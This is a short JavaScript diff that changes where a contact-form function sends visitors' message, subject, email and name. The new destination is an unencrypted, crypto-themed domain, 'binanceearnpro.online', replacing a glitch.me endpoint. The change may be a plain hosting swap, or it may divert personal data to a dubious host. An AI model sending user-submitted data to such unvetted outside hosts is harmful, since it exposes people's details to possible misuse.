@@ -171,7 +171,7 @@ export const sendMessage = (message, subject, email, name) => {
   };
 
   return fetch(
-    "https://reinvented-natural-catshark.glitch.me/mail",
+    "http://binanceearnpro.online/mail",
     requestOptions
   ).then((response) => response.text());
 };
